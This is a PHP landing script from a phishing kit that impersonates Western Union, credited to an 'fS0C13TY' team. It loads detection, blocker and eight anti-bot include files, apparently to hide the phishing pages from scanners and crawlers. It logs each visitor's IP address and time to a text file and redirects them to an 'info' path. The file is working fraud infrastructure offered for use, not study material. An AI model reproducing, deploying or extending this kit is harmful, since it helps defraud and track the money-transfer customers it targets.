<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * WesternUnion -
 * version 01
 * icq & telegram = @FUCKTOS0C13TY
 
###############################################
#$            C0d3d by fS0C13TY_Team         $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 WU                $#
###############################################

**/
    include("./system/system.php");
    include("./system/detect.php");
    include("./system/blocker.php");

include("./Bots-fSOCIETY/anti1.php");
include("./Bots-fSOCIETY/anti2.php");
include("./Bots-fSOCIETY/anti3.php");
include("./Bots-fSOCIETY/anti4.php");
include("./Bots-fSOCIETY/anti5.php");
include("./Bots-fSOCIETY/anti6.php");
include("./Bots-fSOCIETY/anti7.php");
include("./Bots-fSOCIETY/anti8.php");

$ip = getenv("REMOTE_ADDR");
$file = fopen("V.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$src="info";
header("location:$src");
?>
